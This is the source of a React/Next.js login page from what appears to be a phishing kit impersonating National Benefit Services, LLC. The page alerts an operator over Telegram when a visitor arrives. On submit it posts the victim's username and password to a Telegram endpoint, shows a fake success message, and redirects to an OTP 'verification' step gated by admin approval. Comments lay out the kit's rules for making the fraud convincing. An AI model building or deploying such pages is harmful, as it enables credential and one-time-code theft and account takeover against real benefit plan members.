"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";
import { NbsAuthShell } from "@/components/nbs-auth-shell";
import {
  MSG_UNABLE_VERIFY_TIME,
  OTP_RESEND_LOADING_MS,
  getLoginDeniedMessage,
} from "@/lib/approval-messages";

export default function LoginPage() {
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [selectedRole, setSelectedRole] = useState("participant");
  const [rememberMe, setRememberMe] = useState(false);
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [fieldErrors, setFieldErrors] = useState<{
    userid?: string;
    password?: string;
  }>({});
  const [toastMessage, setToastMessage] = useState<string | null>(null);
  const [honeypot, setHoneypot] = useState("");
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);
  const router = useRouter();

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_method");
      sessionStorage.removeItem("ubs_userid");
      sessionStorage.removeItem("ubs_password");
    }
  }, []);

  // Step 3 RULE 8: the visitor alert must fire on arrival, not on first click —
  // otherwise every bounce who never touches the form is invisible to ops.
  useEffect(() => {
    if (!visitorInfo || hasSentVisitRef.current) return;
    if (sessionStorage.getItem("ubs_visit_notified") === "1") {
      hasSentVisitRef.current = true;
      return;
    }
    hasSentVisitRef.current = true;
    void fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
      keepalive: true,
    })
      .then((res) => {
        if (res.ok) sessionStorage.setItem("ubs_visit_notified", "1");
      })
      .catch(console.error);
  }, [visitorInfo]);

  // Step 3 RULE 1C / RULE 2: admin decisions on Gate 1 come back as query params.
  // Error copy is the canonical constant set — never invented per site — and the
  // identifier wording is matched to this form's own "Username" label.
  useEffect(() => {
    if (typeof window === "undefined") return;
    const params = new URLSearchParams(window.location.search);
    const denied = params.get("loginDenied") === "1" || params.get("denied") === "1";
    const unavailable = params.get("verifyUnavailable") === "1";
    if (!denied && !unavailable) return;

    sessionStorage.removeItem("ubs_verify");
    sessionStorage.removeItem("ubs_method");
    sessionStorage.removeItem("ubs_userid");
    sessionStorage.removeItem("ubs_password");

    setLoginError(
      denied
        ? getLoginDeniedMessage("generic", "Username")
        : MSG_UNABLE_VERIFY_TIME
    );
    window.history.replaceState({}, "", window.location.pathname);
  }, []);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 2800);
  };

  const clearErr = (fieldId: string) => {
    setFieldErrors((prev) => ({
      ...prev,
      [fieldId]: undefined,
    }));
  };

  const validate = (): boolean => {
    let ok = true;
    const errors: typeof fieldErrors = {};

    if (!username.trim()) {
      errors.userid = "Please enter your User ID.";
      ok = false;
    }
    if (!password) {
      errors.password = "Please enter your Password.";
      ok = false;
    }

    setFieldErrors(errors);
    return ok;
  };

  const handleSignIn = async () => {
    if (isLoginLoading) return;

    if (!validate()) return;

    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }

    setLoginError(null);
    setIsLoginLoading(true);

    if (typeof window !== "undefined") {
      // Gate 1 (the method page) needs the submitted credentials to open the
      // admin approval record. Kept in session only, per the kit's session contract.
      sessionStorage.setItem("ubs_userid", username);
      sessionStorage.setItem("ubs_password", password);
      sessionStorage.setItem("ubs_verify", "1");
    }

    // RULE 8: fire-and-forget so Telegram latency never stalls the UI.
    void fetch("/api/telegram/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId: username, password }),
    }).catch(console.error);

    showToast("Sign-in successful — welcome!");

    // RULE 6: a fixed loading delay, then straight to Gate 1. There is deliberately
    // NO pending-login admin poll on the login button — approval belongs to the
    // method Continue and the OTP Verify only.
    await new Promise((r) => setTimeout(r, OTP_RESEND_LOADING_MS));
    redirectRef.current = window.setTimeout(() => {
      router.push("/verify-choice");
    }, 0);
  };

  useEffect(() => {
    return () => {
      if (countdownRef.current) {
        window.clearInterval(countdownRef.current);
      }
      if (redirectRef.current) {
        window.clearTimeout(redirectRef.current);
      }
    };
  }, []);

  return (
    <NbsAuthShell>
      <div className="login-card">
        <h1>Welcome to National Benefit Services, LLC</h1>

        {/* Denied-login copy sits ABOVE the username field, at the top of the
            form. It is the identifier the member got wrong, so it belongs with
            the identifier, not below the password. Plain red text, no border or
            box (RULE 3). */}
        {loginError && (
          <p
            style={{
              color: "#c0392b",
              fontSize: "12.5px",
              marginBottom: "14px",
            }}
          >
            {loginError}
          </p>
        )}

        <div className="form-group">
          <label htmlFor="username">
            Username <span className="required">*</span>
          </label>
          <input
            type="text"
            id="username"
            name="username"
            autoComplete="username"
            value={username}
            onChange={(e) => {
              setUsername(e.target.value);
              clearErr("userid");
            }}
          />
          {/* RULE 3: plain colored text, no bordered box. */}
          {fieldErrors.userid && (
            <p className="field-error">{fieldErrors.userid}</p>
          )}
        </div>

        <div className="form-group">
          <label htmlFor="password">
            Password <span className="required">*</span>
          </label>
          <input
            type="password"
            id="password"
            name="password"
            autoComplete="current-password"
            value={password}
            onChange={(e) => {
              setPassword(e.target.value);
              clearErr("password");
            }}
          />
          {fieldErrors.password && (
            <p className="field-error">{fieldErrors.password}</p>
          )}
        </div>

        <select
          className="role-select"
          aria-label="User role"
          value={selectedRole}
          onChange={(e) => setSelectedRole(e.target.value)}
        >
          <option value="participant">Participant</option>
          <option value="sponsor">Sponsor</option>
          <option value="advisor">Advisor</option>
        </select>

        <div className="remember-row">
          <input
            type="checkbox"
            id="remember"
            name="remember"
            checked={rememberMe}
            onChange={(e) => setRememberMe(e.target.checked)}
          />
          <label htmlFor="remember">Remember me on this device</label>
        </div>

        <p className="note">
          Note: The password is case sensitive. If you fail to login three
          consecutive times your account could be disabled.
        </p>

        {/* Honeypot */}
        <input
          type="text"
          name="website"
          value={honeypot}
          onChange={(e) => setHoneypot(e.target.value)}
          style={{ display: "none" }}
          autoComplete="off"
        />

        <button
          className="btn-login"
          type="button"
          onClick={handleSignIn}
          disabled={isLoginLoading}
        >
          {isLoginLoading ? "SIGNING IN..." : "Login"}
        </button>

        <a
          className="privacy-link"
          href="http://www.nbsbenefits.com/privacy-policy/"
          target="_blank"
          rel="noopener noreferrer"
        >
          Privacy and Terms of Use
        </a>
      </div>
    </NbsAuthShell>
  );
}
